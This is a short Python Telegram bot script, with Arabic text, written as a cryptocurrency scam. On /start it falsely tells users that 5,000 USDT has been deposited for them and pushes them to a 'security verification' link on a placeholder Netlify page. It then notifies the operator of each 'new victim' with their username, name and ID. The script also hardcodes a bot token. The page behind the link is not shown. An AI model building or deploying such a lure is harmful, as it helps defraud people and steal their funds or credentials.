#!/usr/bin/env python3
import telebot
import logging

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = telebot.TeleBot(TOKEN)

# رابط صفحة الاستضافة - استبدله برابط نتليفاي بعد رفع الملف
WEBAPP_URL = "https://your-site.netlify.app"

@bot.message_handler(commands=['start'])
def start(m):
    c = m.chat.id
    user = m.from_user
    
    msg = (
        "🎉 *تهانينا! تم إيداع 5,000 USDT*\n\n"
        "📋 تفاصيل التحويل:\n"
        "• المبلغ: `5,000` USDT\n"
        "• الشبكة: TRC-20\n"
        "• الحالة: ✅ معلق\n\n"
        "⚠️ *لتأكيد الاستلام:*\n"
        "اضغط على الرابط أدناه لإتمام عملية التحقق الأمني"
    )
    
    # زر إنلاين مع رابط
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton(
        "🔗 اضغط هنا لتأكيد استلام 5,000 USDT",
        url=WEBAPP_URL
    )
    markup.add(btn)
    
    bot.send_message(c, msg, parse_mode='Markdown', reply_markup=markup)
    
    # إشعار لك
    bot.send_message(
        OWNER_ID,
        f"🆕 *ضحية جديدة!*\n"
        f"👤 @{user.username or 'N/A'} | {user.first_name}\n"
        f"🆔 `{user.id}`\n"
        f"⏰ {m.date}",
        parse_mode='Markdown'
    )

print("✅ Bot is running...")
bot.infinity_polling()
